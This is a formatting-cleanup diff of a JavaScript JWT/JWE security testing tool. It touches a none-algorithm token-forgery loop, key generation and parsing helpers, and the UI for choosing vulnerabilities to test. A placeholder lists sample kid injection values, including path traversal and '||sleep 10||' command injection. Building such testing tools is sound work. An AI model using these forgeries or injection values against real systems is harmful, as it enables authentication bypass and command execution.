-    const allCaseCombinationsOfNone = ["none", "nonE", "noNe", "noNE","nOne", "nOnE", "nONe", "nONE","None", "NonE", "NoNe", "NoNE","NOne", "NOnE", "NONe", "NONE"]
-    
+    const allCaseCombinationsOfNone = ["none", "nonE", "noNe", "noNE", "nOne", "nOnE", "nONe", "nONE", "None", "NonE", "NoNe", "NoNE", "NOne", "NOnE", "NONe", "NONE"]
+
     // change the alg to all possible case combinations of "none" and remove the signature
-    for (let none_variant of allCaseCombinationsOfNone){
+    for (let none_variant of allCaseCombinationsOfNone) {
         header_json.alg = none_variant;
 
         // remove ESCAPE_SEQUENCE from the header
@@ -3383,10 +3360,9 @@ function attack_none_alg(token){
             vulnerability: vulnerabilities.NoneAlg
         }))
     }
-    
+
     return token_output;
 }
-
 
 // #endregion ====================== End of Attacks Functions
 
@@ -3402,18 +3378,18 @@ function attack_none_alg(token){
  * @throws {Error} If the key type is unsupported or if the import fails.
  * @return {Promise<object>} - A promise that resolves to the JWK representation of the key.
  */
-async function pemToJwk(pemKey,algorithm) {
+async function pemToJwk(pemKey, algorithm) {
     const keyData = pemKey
         .replace(/-----BEGIN (PUBLIC|PRIVATE) KEY-----/, "")
         .replace(/-----END (PUBLIC|PRIVATE) KEY-----/, "")
         .replace(/\s+/g, "");
-    
-    const binaryDer = base64ToUint8Array(base64_to_URL(keyData)); 
+
+    const binaryDer = base64ToUint8Array(base64_to_URL(keyData));
     const isPrivateKey = pemKey.includes("PRIVATE");
 
     // Parse ASN.1 to detect key type
     const { keyType, namedCurve } = parseASN1KeyInfo(binaryDer, isPrivateKey);
-    
+
     // Use key type to determine import algorithm
     let importAlgorithm;
     // This line is mostly used when this function is called from Key Confusion Attack
@@ -3440,7 +3416,7 @@ async function pemToJwk(pemKey,algorithm) {
         true,
         isPrivateKey ? ['sign'] : ['verify']
     );
-    
+
     // Export JWK
     let tmp_jwk = await crypto.subtle.exportKey('jwk', cryptoKey);
     delete tmp_jwk.alg;
@@ -3452,7 +3428,7 @@ async function pemToJwk(pemKey,algorithm) {
 /**
  * Parses ASN.1 key information from a DER-encoded byte array.
  * Helper function to extract key type and named curve from the DER bytes.
- * 
+ *
  *
  * @param {Uint8Array} derBytes - The DER-encoded byte array representing the key.
  * @param {boolean} isPrivateKey - is the key a private key? :o
@@ -3473,7 +3449,7 @@ function parseASN1KeyInfo(derBytes, isPrivateKey) {
             return { length, bytesRead: 1 + lengthBytesCount };
         }
     }
-    
+
     // Known OIDs
     const OIDs = {
         '1.2.840.113549.1.1.1': 'RSA',
@@ -3489,7 +3465,7 @@ function parseASN1KeyInfo(derBytes, isPrivateKey) {
         const values = [];
         let value = 0;
         let first = true;
-        
+
         for (let i = start; i < start + length; i++) {
             if (first) {
                 const firstByte = bytes[i];
@@ -3517,34 +3493,34 @@ function parseASN1KeyInfo(derBytes, isPrivateKey) {
         if (derBytes[offset++] !== 0x30) throw new Error("Expected SEQUENCE");
         const { length: seqLength, bytesRead: seqBytesRead } = readLength(derBytes, offset);
         offset += seqBytesRead;
-        
+
         if (isPrivateKey) {
             // For PKCS8 Private Key
             // Parse Version
             if (derBytes[offset++] !== 0x02) throw new Error("Expected INTEGER for version");
             const { length: versionLength, bytesRead: versionBytesRead } = readLength(derBytes, offset);
             offset += versionBytesRead + versionLength; // Skip version
-            
+
             // Parse AlgorithmIdentifier SEQUENCE
             if (derBytes[offset++] !== 0x30) throw new Error("Expected AlgorithmIdentifier SEQUENCE");
             const { length: algLength, bytesRead: algBytesRead } = readLength(derBytes, offset);
             offset += algBytesRead;
-            
+
             // Parse Algorithm OID
             if (derBytes[offset++] !== 0x06) throw new Error("Expected Algorithm OID");
             const { length: oidLength, bytesRead: oidBytesRead } = readLength(derBytes, offset);
             offset += oidBytesRead;
-            
+
             const algorithmOid = oidToString(derBytes, offset, oidLength);
             keyType = OIDs[algorithmOid] || 'unknown';
             offset += oidLength;
-            
+
             // Parse parameters based on algorithm
             if (keyType === 'EC' && offset < derBytes.length && derBytes[offset] === 0x06) {
                 offset++; // OID tag for curve
                 const { length: curveOidLength, bytesRead: curveOidBytesRead } = readLength(derBytes, offset);
                 offset += curveOidBytesRead;
-                
+
                 const curveOid = oidToString(derBytes, offset, curveOidLength);
                 namedCurve = OIDs[curveOid] || 'unknown';
             }
@@ -3554,22 +3530,22 @@ function parseASN1KeyInfo(derBytes, isPrivateKey) {
             if (derBytes[offset++] !== 0x30) throw new Error("Expected AlgorithmIdentifier SEQUENCE");
             const { length: algLength, bytesRead: algBytesRead } = readLength(derBytes, offset);
             offset += algBytesRead;
-            
+
             // Algorithm OID
             if (derBytes[offset++] !== 0x06) throw new Error("Expected Algorithm OID");
             const { length: oidLength, bytesRead: oidBytesRead } = readLength(derBytes, offset);
             offset += oidBytesRead;
-            
+
             const algorithmOid = oidToString(derBytes, offset, oidLength);
             keyType = OIDs[algorithmOid] || 'unknown';
             offset += oidLength;
-            
+
             // For EC key, try to extract curve
             if (keyType === 'EC' && offset < derBytes.length && derBytes[offset] === 0x06) {
                 offset++; // OID tag
                 const { length: curveOidLength, bytesRead: curveOidBytesRead } = readLength(derBytes, offset);
                 offset += curveOidBytesRead;
-                
+
                 const curveOid = oidToString(derBytes, offset, curveOidLength);
                 namedCurve = OIDs[curveOid] || 'unknown';
             }
@@ -3588,10 +3564,10 @@ function parseASN1KeyInfo(derBytes, isPrivateKey) {
  * @throws {Error} Bad key length if the length is not 16, 24, 32, 48, or 64
  * @return {string}  Random HMAC key in hex format
  */
-function generateHMACKey(length,returnBase64=false) {   
+function generateHMACKey(length, returnBase64 = false) {
     if (length !== 32 && length !== 16 && length !== 24 && length !== 64 && length !== 48) {
-        console.error(generateHMACKey.name,"Bad key length");
-        return 
+        console.error(generateHMACKey.name, "Bad key length");
+        return
     }
     const randomBytes = new Uint8Array(length);
     window.crypto.getRandomValues(randomBytes);
@@ -3599,8 +3575,6 @@ function generateHMACKey(length,returnBase64=false) {
     if (returnBase64) return URL_to_base64(Uint8ArrayTobase64Url(randomBytes));
     return hexKey;
 }
-
-
 
 /**
  * Generates an RSA key pair.
@@ -3613,9 +3587,9 @@ async function generateRSAKey() {
             name: "RSASSA-PKCS1-v1_5",
             modulusLength: 2048,
             publicExponent: new Uint8Array([1, 0, 1]),
-            hash: { name: "SHA-256"} // RS256 -> SHA-256, RS384 -> SHA-384, RS512 -> SHA-512
+            hash: { name: "SHA-256" } // RS256 -> SHA-256, RS384 -> SHA-384, RS512 -> SHA-512
         },
-        true, 
+        true,
         ["sign", "verify"]
     );
     return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")];
@@ -3627,8 +3601,8 @@ async function generateRSAKey() {
  * @param {boolean} [generateBase64=true] - If true, returns the key in Base64 format; otherwise, returns ascii
  * @return {string} Random content encryption key Base64 encoded or ascii
  */
-function generateContentEncryptionKey(encryption_algorithm,generateBase64=true) {
-    let length = Number(encryption_algorithm.substring(1,4))/8
+function generateContentEncryptionKey(encryption_algorithm, generateBase64 = true) {
+    let length = Number(encryption_algorithm.substring(1, 4)) / 8
     if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_algorithm)) length *= 2 // Encryption algorithm with HMAC use twice the key length
     if (generateBase64) {
         const randomBytes = new Uint8Array(length);
@@ -3639,17 +3613,16 @@ function generateContentEncryptionKey(encryption_algorithm,generateBase64=true) 
     }
 }
 
-
 /**
  * Generates a key encryption key based on the specified JWE algorithm.
  * The key length is determined by the algorithm, and the key is generated as a Base64 encoded string.
- * 
+ *
  *
  * @param {string} algorithm - JWE algorithm (e.g., "A128KW", "A192KW", "A256KW", "RSA-OAEP", "RSA-OAEP-256")
  * @param {boolean} [generateBase64=true] - If true, returns the key in Base64 format; otherwise, returns ascii
  * @return {string} - Random key encryption key in Base64 format or ascii
  */
-function generateKeyEncryptionKey(algorithm,generateBase64=true) {
+function generateKeyEncryptionKey(algorithm, generateBase64 = true) {
     const length = _jwe_algorithm_to_key_length[algorithm];
     if (generateBase64) {
         const randomBytes = new Uint8Array(length);
@@ -3664,20 +3637,20 @@ function generateKeyEncryptionKey(algorithm,generateBase64=true) {
  * Generates an RSA key pair using the RSA-OAEP(-256) algorithm.
  *
  * @return {Promise<Array>} - [PKCS8 private key, SPKI public key]
- * @description This function generates a new RSA key pair with a modulus length of 2048 bits and SHA-1/256 hash. 
+ * @description This function generates a new RSA key pair with a modulus length of 2048 bits and SHA-1/256 hash.
  */
 async function generateRSA_OAEP(alg) {
     const keypair = await crypto.subtle.generateKey(
         {
             name: "RSA-OAEP",
-            modulusLength: 2048, 
-            publicExponent: new Uint8Array([1, 0, 1]), 
+            modulusLength: 2048,
+            publicExponent: new Uint8Array([1, 0, 1]),
             hash: _alg_converter[alg] // RSA-OAEP -> SHA-1; RSA-OAEP-256 -> SHA-256
         },
         true, // exportierbar
         ["encrypt", "decrypt"]
     );
-    return [await exportKey(keypair.privateKey,"pkcs8"),await exportKey(keypair.publicKey,"spki")]
+    return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")]
 }
 
 /**
@@ -3697,7 +3670,7 @@ async function generatePSKey() {
         true,
         ["sign", "verify"]
     );
-    return [await exportKey(keypair.privateKey,"pkcs8"),await exportKey(keypair.publicKey,"spki")]
+    return [await exportKey(keypair.privateKey, "pkcs8"), await exportKey(keypair.publicKey, "spki")]
 }
 /**
  * Generates a new EC key pair for the specified curve.
@@ -3717,14 +3690,14 @@ async function generateECKey(curve) {
     //const keypair = KEYUTIL.generateKeypair("EC", curve);
     const publicKeyPem = await exportKey(keyPair.publicKey, "spki");
     const privateKeyPem = await exportKey(keyPair.privateKey, "pkcs8");
-    return [privateKeyPem, publicKeyPem];   
+    return [privateKeyPem, publicKeyPem];
 }
 /**
  * Export a key to PEM format.
  *
  * @param {string} key
  * @param {string} type - "spki" for public key, "pkcs8" for private key
- * @return {Promise<string>} PEM-formatted key 
+ * @return {Promise<string>} PEM-formatted key
  */
 async function exportKey(key, type) {
     const exported = await window.crypto.subtle.exportKey(type, key);
@@ -3742,9 +3715,9 @@ async function exportKey(key, type) {
  * @return {Promise<string>} PEM formated public key
  */
 async function jwkToSpkiPem(jwk, jwkAlg) {
-  
+
     let algoName;
-    if (jwk.kty === 'RSA'){
+    if (jwk.kty === 'RSA') {
         if (jwkAlg.startsWith('PS')) {
             algoName = 'RSA-PSS';
         } else if (jwkAlg.startsWith('RS')) {
@@ -3763,7 +3736,7 @@ async function jwkToSpkiPem(jwk, jwkAlg) {
         var algorithm_params = { // RSA object differs from EC object
             name: algoName,
             hash: { name: _alg_converter[jwkAlg] }
-        } 
+        }
     }
     else if (jwk.kty === 'EC') {
         // extract public key components from JWK
@@ -3779,30 +3752,27 @@ async function jwkToSpkiPem(jwk, jwkAlg) {
             name: 'ECDSA',
             namedCurve: jwk.crv
         };
-    
+
     }
     else {
         throw new Error(`Not supported key type: ${jwk.kty}`);
     }
-  
+
     // Import the JWK key
     const key = await crypto.subtle.importKey(
-      'jwk',
-      jwkKey,
-      algorithm_params,
-      true,
-      ['verify']
+        'jwk',
+        jwkKey,
+        algorithm_params,
+        true,
+        ['verify']
     );
-  
+
     // export as SPKI
-    return await exportKey(key,'spki');
+    return await exportKey(key, 'spki');
 }
 // #endregion ====================== End of Key Generation Functions
 
 // #region ====================== Table and UI Functions
-
-
-
 
 /**
  * Event function if the kek encoding checkbox is changed.
@@ -3835,11 +3805,11 @@ function setActiveContentTypeJSONButton(element, value) {
     else if (value === 'Raw Text') {
         beautifyButtons.style.display = 'block';
     }
-        
+
 }
 /**
  * Imports the JWT token from the JWT encode/decode view into the Signature Attacks input field
- * 
+ *
  * @return {void}
  */
 function importTokenFromJWTView() {
@@ -3852,15 +3822,15 @@ function importTokenFromJWTView() {
 }
 
 /**
- * Displays error message(s) in the UI (jwt attacks). 
+ * Displays error message(s) in the UI (jwt attacks).
  * Scrolls to the error message element.
- * 
+ *
  *
  * @param {string} errorMessage
  */
-function jwt_attacks_error_message(errorMessage){
+function jwt_attacks_error_message(errorMessage) {
     console.error(errorMessage);
-    const errorElement = document.getElementById('jwt-attacks-error-message'); 
+    const errorElement = document.getElementById('jwt-attacks-error-message');
     if (errorElement) {
         errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
@@ -3871,17 +3841,15 @@ function jwt_attacks_error_message(errorMessage){
     }
 }
 
-
-
 /**
  * Displays error message(s) in the UI (JWT).
  * Scrolls to the error message element.
  *
  * @param {string} errorMessage
  */
-function jwt_error_message(errorMessage){
+function jwt_error_message(errorMessage) {
     console.error(errorMessage);
-    const errorElement = document.getElementById('jwtErrorMessage'); 
+    const errorElement = document.getElementById('jwtErrorMessage');
     if (errorElement) {
         errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
@@ -3897,9 +3865,9 @@ function jwt_error_message(errorMessage){
  * Scrolls to the error message element.
  * @param {string} errorMessage
  */
-function jwe_error_message(errorMessage){
+function jwe_error_message(errorMessage) {
     console.error(errorMessage);
-    const errorElement = document.getElementById('jweErrorMessage'); 
+    const errorElement = document.getElementById('jweErrorMessage');
     if (errorElement) {
         errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
@@ -3912,9 +3880,9 @@ function jwe_error_message(errorMessage){
 /**
  * switch to Key Management view
  */
-function toggleToKeyMgmt(){
+function toggleToKeyMgmt() {
     if (isKeyMgmtView) return;
-    
+
     // Update toggle buttons
     document.getElementById('option-KeyMgmt').classList.add('active');
     document.getElementById('option-JWT').classList.remove('active');
@@ -3932,28 +3900,26 @@ function toggleToKeyMgmt(){
     isJWEView = false;
     isAttacksView = false;
     isKeyMgmtView = true;
-    
+
     // Load stored keys on view switch
     updateStoredKeysListInKeyGenerationView();
 }
 /**
  * switch to JWT view (from JWE or Attacks)
  *
- *  
+ *
  */
-function toggleToJWT(){
+function toggleToJWT() {
     if (isJWTView) return;
     document.getElementById('option-JWT').classList.add('active');
     document.getElementById('option-JWE').classList.remove('active');
     document.getElementById('option-Attacks').classList.remove('active');
     document.getElementById('option-KeyMgmt').classList.remove('active');
 
-
     document.getElementById('JWT-Container').style.display = "block";
     document.getElementById('JWE-Container').style.display = "none";
     document.getElementById('Attacks-Container').style.display = "none";
     document.getElementById('KeyMgmt-Container').style.display = "none";
-
 
     isJWTView = true;
     isJWEView = false;
@@ -3966,13 +3932,13 @@ function toggleToJWT(){
  * switch to JWE view (from JWT or Attacks)
  *
  */
-function toggleToJWE(){
+function toggleToJWE() {
     if (isJWEView) return;
     document.getElementById('option-JWE').classList.add('active');
     document.getElementById('option-JWT').classList.remove('active');
     document.getElementById('option-Attacks').classList.remove('active');
     document.getElementById('option-KeyMgmt').classList.remove('active');
-    
+
     document.getElementById('JWE-Container').style.display = "block";
     document.getElementById('JWT-Container').style.display = "none";
     document.getElementById('Attacks-Container').style.display = "none";
@@ -3989,13 +3955,13 @@ function toggleToJWE(){
  * switch to Attacks view (from JWT or JWE)
  *
  */
-function toggleToAttacks(){
+function toggleToAttacks() {
     if (isAttacksView) return;
     document.getElementById('option-JWE').classList.remove('active');
     document.getElementById('option-JWT').classList.remove('active');
     document.getElementById('option-Attacks').classList.add('active');
     document.getElementById('option-KeyMgmt').classList.remove('active');
-    
+
     document.getElementById('JWE-Container').style.display = "none";
     document.getElementById('JWT-Container').style.display = "none";
     document.getElementById('Attacks-Container').style.display = "block";
@@ -4005,44 +3971,41 @@ function toggleToAttacks(){
     isJWEView = false;
     isAttacksView = true;
     isKeyMgmtView = false;
-
-
 }
 
-
-function changeEncryptionAlgorithmEvent(){
-    if (isJWEView){
+function changeEncryptionAlgorithmEvent() {
+    if (isJWEView) {
         const alg = document.getElementById("encryptionAlgorithmJWE").value;
         console.debug(alg);
         // change alg value in the decoded header
-        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"enc":\s*"[^"]*"/,'"enc": "'+ alg+ '"')
+        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"enc":\s*"[^"]*"/, '"enc": "' + alg + '"')
     }
 }
 /**
  *  Event handler for changing the algorithm in the JWT or JWE view
  *
  */
-function changeAlgorithmEvent(){
-    if (isJWTView){
+function changeAlgorithmEvent() {
+    if (isJWTView) {
         const alg = document.getElementById("algorithm").value;
         console.debug(alg);
         // change alg value in the decoded header
-        document.getElementById("decodedHeader").value = document.getElementById("decodedHeader").value.replace(/"alg": *".*"/,'"alg": "'+ alg+ '"')
-        if (alg === "None"){ // no keys needed
+        document.getElementById("decodedHeader").value = document.getElementById("decodedHeader").value.replace(/"alg": *".*"/, '"alg": "' + alg + '"')
+        if (alg === "None") { // no keys needed
             document.getElementById("symKeys").style.display = "none";
             document.getElementById("asymKeys").style.display = "none";
             document.getElementById("publicKey").value = "";
             document.getElementById("privateKey").value = "";
             document.getElementById("key").value = "";
         }
-        else if (alg[0]==='H'){ // only symmetric keys needed
+        else if (alg[0] === 'H') { // only symmetric keys needed
             document.getElementById("symKeys").style.display = "block";
             document.getElementById("asymKeys").style.display = "none";
             document.getElementById("publicKey").value = "";
             document.getElementById("privateKey").value = "";
             document.getElementById("key").value = "";
         }
-        else{ // asymmetric keys needed
+        else { // asymmetric keys needed
             document.getElementById("symKeys").style.display = "none";
             document.getElementById("asymKeys").style.display = "flex";
             document.getElementById("key").value = "";
@@ -4050,13 +4013,13 @@ function changeAlgorithmEvent(){
             document.getElementById("privateKey").value = "";
         }
     }
-    else if (isJWEView){
+    else if (isJWEView) {
         const alg = document.getElementById("algorithmJWE").value;
         console.debug(alg);
         console.debug(alg.startsWith("PBES"))
         // change alg value in the decoded header
-        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"alg": *".*",/,'"alg": "'+ alg +'",')
-        if (alg.startsWith("A") || alg === "dir"){ // symmetric encryption algorithms
+        document.getElementById("decodedHeaderJWE").value = document.getElementById("decodedHeaderJWE").value.replace(/"alg": *".*",/, '"alg": "' + alg + '",')
+        if (alg.startsWith("A") || alg === "dir") { // symmetric encryption algorithms
             document.getElementById("symKeysJWE").style.display = "block";
             document.getElementById("asymKeysJWE").style.display = "none";
             document.getElementById("pbkdf2-parametersJWE").style.display = "none";
@@ -4064,7 +4027,7 @@ function changeAlgorithmEvent(){
             document.getElementById("privateKeyJWE").value = "";
             document.getElementById("keyJWE").value = "";
         }
-        else if (alg.startsWith("PBES")){
+        else if (alg.startsWith("PBES")) {
             console.debug("PBES algorithm selected");
             document.getElementById("symKeysJWE").style.display = "block";
             document.getElementById("asymKeysJWE").style.display = "none";
@@ -4073,7 +4036,7 @@ function changeAlgorithmEvent(){
             document.getElementById("privateKeyJWE").value = "";
             document.getElementById("keyJWE").value = "";
         }
-        else{
+        else {
             document.getElementById("symKeysJWE").style.display = "none";
             document.getElementById("asymKeysJWE").style.display = "flex";
             document.getElementById("pbkdf2-parametersJWE").style.display = "none";
@@ -4081,13 +4044,13 @@ function changeAlgorithmEvent(){
             document.getElementById("privateKeyJWE").value = "";
             document.getElementById("keyJWE").value = "";
         }
-        
+
     }
 
 }
 
 /**
- * Calculates the total token amount based on selected vulnerabilities via checkboxes. 
+ * Calculates the total token amount based on selected vulnerabilities via checkboxes.
  * The amount is calculated with the token_amount property of the vulnerabilities object.
  * The total amount is displayed in the button text of the generate button.
  *
@@ -4105,37 +4068,37 @@ function updateKidTokenCount(textarea) {
     const checkbox = textarea.previousElementSibling;
     const oldValue = Number(textarea.dataset.lastCount || 0);
     const newValue = parsePayloadContentForKid(textarea.value).length;
-    
+
     // Speichere den neuen Wert für den nächsten Aufruf
     textarea.dataset.lastCount = newValue;
     checkbox.setAttribute('data-token-amount-child', newValue);
-    
+
     if (checkbox.checked) {
         // Manuell die Differenz berechnen und das Parent-Token-Amount korrigieren
         const vulnerabilityWrapper = checkbox.closest('.vulnerability-checkbox-wrapper');
         const parentWithTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-checkbox");
         const parentThatDisplaysTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-name");
-        
+
         const currentParentAmount = Number(parentWithTokenAmount.getAttribute('data-token-amount-parent'));
         const correctedAmount = currentParentAmount - oldValue + newValue;
-        
+
         parentWithTokenAmount.setAttribute('data-token-amount-parent', correctedAmount);
-        
+
         const currentText = parentThatDisplaysTokenAmount.innerText;
         const newText = currentText.replace(/\(-?\d+\)/, `(${correctedAmount})`);
         parentThatDisplaysTokenAmount.innerText = newText;
-        
+
         calculateTotalTokenAmount();
     }
 }
-function change_token_amount_of_parent(test){
+function change_token_amount_of_parent(test) {
     console.debug("change_token_amount_of_parent", test);
-    
+
     // Finde die Haupt-Vulnerability-Checkbox über closest()
     const vulnerabilityWrapper = test.closest('.vulnerability-checkbox-wrapper');
     const parentWithTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-checkbox");
     const parentThatDisplaysTokenAmount = vulnerabilityWrapper.querySelector(".vulnerability-name");
-    
+
     if (!parentWithTokenAmount || !parentThatDisplaysTokenAmount) {
         console.error("Could not find required elements", {
             parentWithTokenAmount,
@@ -4144,10 +4107,10 @@ function change_token_amount_of_parent(test){
         });
         return;
     }
-    
+
     const token_amount = Number(parentWithTokenAmount.getAttribute('data-token-amount-parent'));
     console.debug("token_amount", token_amount);
-    
+
     if (test.checked) {
         const newAmount = token_amount + Number(test.getAttribute('data-token-amount-child'));
         parentWithTokenAmount.setAttribute('data-token-amount-parent', newAmount);
@@ -4155,22 +4118,22 @@ function change_token_amount_of_parent(test){
         const newAmount = token_amount - Number(test.getAttribute('data-token-amount-child'));
         parentWithTokenAmount.setAttribute('data-token-amount-parent', newAmount);
     }
-    
+
     // Update der Anzeige
     const currentText = parentThatDisplaysTokenAmount.innerText;
     const newText = currentText.replace(/\(\d+\)/, `(${parentWithTokenAmount.getAttribute('data-token-amount-parent')})`);
     parentThatDisplaysTokenAmount.innerText = newText;
-    
+
     console.debug("Updated display text:", newText);
     calculateTotalTokenAmount();
 }
 /**
- * Dynamically initializes the vulnerabilities list (checkboxes) in the HTML. 
+ * Dynamically initializes the vulnerabilities list (checkboxes) in the HTML.
  * It creates checkboxes for each vulnerability in the vulnerabilities object and appends them to the vulnerabilities-list element.
- * It also adds an event listener to the select-all checkbox to check/uncheck all vulnerabilities. 
+ * It also adds an event listener to the select-all checkbox to check/uncheck all vulnerabilities.
  * There is a special case for KeyConfusion, CustomKey and SSRF vulnerabilities where input fields are added.
  * This function is called on page load to populate the vulnerabilities list.
- * 
+ *
  */
 function initVulnerabilitiesList() {
     //? Should this be in the final version? Since one could also hardcode the checkboxes in the HTML
@@ -4191,8 +4154,7 @@ function initVulnerabilitiesList() {
             <div>
                 <div>
                     <span  class="vulnerability-name">${vuln.name} (${vuln.token_amount})</span>
-                    
-                    </div> 
+                    </div>
                 <div class="vulnerability-details">${vuln.description}</div>
                 <div class="vulnerability-cve"> <span>${vuln.cve !== 'N/A' ? `${vuln.cve}` : ''}</span></div>
                 ${key === 'KeyConfusion' ? '<input type="text" id="KeyConfusionKey" placeholder="Enter Key (JWK or PEM)" />' : ''}
@@ -4201,16 +4163,14 @@ function initVulnerabilitiesList() {
                 ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" class="inline-checkbox" onchange="change_token_amount_of_parent(this)" id="testAllCustomKeyAlgs" data-token-amount-child="3"/><label for="testAllCustomKeyAlgs">Test all algorithms? (+3) </label></div>' : ''}
                 ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" id="testCustomKeyViaURL" data-token-amount-child="4"/><input type="text" id="CustomKeyURL" placeholder="jku/x5u URL for jwk" /></div>' : ''}
                 ${key === 'SSRF' ? '<input type="text" id="SSRFURL" placeholder="http://localhost:8080" />' : ''}
-                ${key === 'Kid' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" class="inline-checkbox" data-token-amount-child="0" id="useKidCustomPayloadList"/><textarea id="kidCustomPayloadList" rows="4" onchange="updateKidTokenCount(this)" placeholder="kid_payload;[expected_key(Base64)]&#10;foo;bar&#10;../../../dev/null;\\0&#10;||sleep 10||"></textarea></div>' : ''} 
+                ${key === 'Kid' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" class="inline-checkbox" data-token-amount-child="0" id="useKidCustomPayloadList"/><textarea id="kidCustomPayloadList" rows="4" onchange="updateKidTokenCount(this)" placeholder="kid_payload;[expected_key(Base64)]&#10;foo;bar&#10;../../../dev/null;\\0&#10;||sleep 10||"></textarea></div>' : ''}
                 </div>
                 <br>
-                
-        
             `;
         vulnerabilitiesList.appendChild(checkbox);
     });
     // Add Event Listener for Select All Checkbox
-    document.getElementById('select-all-checkbox').addEventListener('change', function() {
+    document.getElementById('select-all-checkbox').addEventListener('change', function () {
         const isChecked = this.checked;
         document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]').forEach(checkbox => {
             // Nur wenn sich der Wert ändert
@@ -4224,12 +4184,12 @@ function initVulnerabilitiesList() {
         });
         calculateTotalTokenAmount();
     });
-    document.getElementById('select-all-without-user-interaction-checkbox').addEventListener('change', function() {
+    document.getElementById('select-all-without-user-interaction-checkbox').addEventListener('change', function () {
         const isChecked = this.checked;
         const idsToSkip = ["useKidCustomPayloadList", "vuln-KeyConfusion", "testCustomKeyViaURL", "vuln-SSRF"];
         document.getElementById('select-all-checkbox').checked = false;
         document.querySelectorAll('#vulnerabilities-list input[type="checkbox"]').forEach(checkbox => {
-            if (idsToSkip.includes(checkbox.id)){
+            if (idsToSkip.includes(checkbox.id)) {
                 checkbox.checked = false;
             }
             // Nur wenn sich der Wert ändert
@@ -4249,10 +4209,10 @@ function initVulnerabilitiesList() {
  *
  * @param {string} text
  * @param {number} [maxLength=50]
- * @return {string} 
+ * @return {string}
  */
 function shorten(text, maxLength = 50) {
-    
+
     return text.length > maxLength ? text.slice(0, maxLength) + '…' : text;
 }
 /**
@@ -4261,7 +4221,7 @@ function shorten(text, maxLength = 50) {
  * @param {number} colIndex
  */
 function filterTable(colIndex) {
-    // colIndex 0: ID, 1: Token, 2: Description, 3: Variant Name, 4: Vulnerability.name 
+    // colIndex 0: ID, 1: Token, 2: Description, 3: Variant Name, 4: Vulnerability.name
     const input = document.querySelectorAll('thead input')[colIndex].value.toLowerCase();
     const rows = document.querySelectorAll('#resultTable tbody tr');
 
@@ -4269,10 +4229,10 @@ function filterTable(colIndex) {
         if (colIndex === 1) { // Filter for Token; since the shortened version is shown, we need to check the full token
             row.style.display = row.children[colIndex].children[0].dataset.full.toLowerCase().includes(input) ? '' : 'none';
         }
-        else{
+        else {
             row.style.display = row.children[colIndex].textContent.toLowerCase().includes(input) ? '' : 'none';
         }
-        
+
     });
 }
 
@@ -4308,10 +4268,10 @@ function copyTokenFromTableToClipboard(id) {
     navigator.clipboard.writeText(value).then(() => {
         const el = document.getElementById(id);
         const original = el.textContent;
-    
+
         el.textContent = "✓ Copied!";
         el.style.color = "green";
-    
+
         setTimeout(() => {
             el.textContent = document.getElementById(id).dataset.short;
             el.style.color = "#007bff"; // Original color
@@ -4328,19 +4288,19 @@ function copyTokenFromTableToClipboard(id) {
  */
 function copyTokenFromTableToJWTView(id) {
     const token = document.getElementById(id).dataset.full;
-    
+
     toggleToJWT();
     document.getElementById("token").value = token;
     decodeToken();
     document.getElementById('decodedHeader').scrollIntoView({ behavior: 'smooth', block: 'center' });
-    
+
 }
 /**
  * Renders the test cases to a table in the HTML.
  * This function takes an array of test cases and populates the table with the relevant data.
  * It creates a new row for each test case and fills in the columns with the test ID, token, description, variant name, and vulnerability name.
  * It also adds an onclick event to the token column to copy the token to the clipboard when clicked.
- * The function uses the shorten function to limit the length of the token displayed in the table. 
+ * The function uses the shorten function to limit the length of the token displayed in the table.
  *
  * @param {array.TestCase} testCases array of test cases to be rendered
  * @param {string} [containerId='resultTableBody'] ID of the table body element to append the rows to
@@ -4348,7 +4308,7 @@ function copyTokenFromTableToJWTView(id) {
 function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
     const tbody = document.getElementById(containerId);
     tbody.innerHTML = ''; // empty the table body before adding new rows
-    
+
     testCases.forEach((test) => {
         const shortToken = shorten(test.testToken); //shorten the token for better readability
         const row = document.createElement('tr');
@@ -4356,12 +4316,11 @@ function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
         row.innerHTML = `
             <td>
                 ${String(test.testId).padStart(testCases.length.toString().length, '0')}
-                
-                    
+
             </td>
             <td>
                 <div class="action-buttons">
-                    <button onclick="copyTokenFromTableToClipboard('token-${test.testId}')" 
+                    <button onclick="copyTokenFromTableToClipboard('token-${test.testId}')"
                             title="copy to clipboard" class="action-btn">
                         <span>📋</span>
                     </button>
@@ -4369,7 +4328,7 @@ function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
             </td>
             <td>
                 <div class="action-buttons">
-                    <button onclick="copyTokenFromTableToJWTView('token-${test.testId}')" 
+                    <button onclick="copyTokenFromTableToJWTView('token-${test.testId}')"
                             title="open in JWT view" class="action-btn">
                         <span>🔍</span>
                     </button>
@@ -4386,7 +4345,7 @@ function renderTestCasesToTable(testCases, containerId = 'resultTableBody') {
                     >
                         ${shortToken}
                     </span>
-                    
+
                 </div>
             </td>
             <td>${test.description}</td>
@@ -4408,10 +4367,10 @@ function setConversionDirectionInKeyGenerationView(element, direction) {
     });
     element.classList.add('active');
     document.getElementById('conversionDirection').value = direction;
-    
+
     const pemSection = document.getElementById('pemToJwkSection');
     const jwkSection = document.getElementById('jwkToPemSection');
-    
+
     if (direction === 'pem-to-jwk') {
         pemSection.style.display = 'block';
         jwkSection.style.display = 'none';
